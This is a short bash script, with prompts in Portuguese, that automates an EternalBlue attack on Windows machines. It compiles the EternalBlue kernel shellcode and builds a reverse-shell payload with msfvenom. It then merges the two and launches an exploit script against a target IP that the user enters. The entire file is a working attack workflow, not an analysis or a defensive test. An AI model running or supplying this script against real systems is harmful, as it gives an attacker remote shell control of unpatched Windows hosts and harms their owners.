#!/bin/bash

        echo "Etapa 1"
	echo "nasm -f bin eternalblue_kshellcode_x86.asm -o scx86.bin"
	nasm -f bin eternalblue_kshellcode_x86.asm -o scx86.bin
	echo "Shellcode x86 Compilado"
	echo 

	echo "Etapa 2"
	echo "Gerar reverse shell com msfvenom"
	echo

	echo "Local IP: " 
	read ip
	echo "Local Port: "
	read port
	echo "O payload do tipo Stageless"
	echo

	echo "msfvenom -p windows/shell_reverse_tcp -f raw -a x86 -o scx86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$port"
	msfvenom -p windows/shell_reverse_tcp -f raw -a x86 -o scx86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$port
	echo 
	echo "Payload criado"
	echo 

	echo "Etapa 3"
	echo "Merge shellcode scx86.bin e payload scx86_msf.bin"
        echo "cat scx86.bin scz86_msf.bin > final_sc_x86.bin"
	cat scx86.bin scx86_msf.bin > final_sc_x86.bin
	echo "Paylod Pronto"
	echo 
	
	echo "Etapa 5"
	echo "Target: "
	read target
	echo
	echo "Attack !!"
	echo "python2 eternalblue_exploit7.py $target final_sc_x86.bin"
	python2 eternalblue_exploit7.py $target final_sc_x86.bin




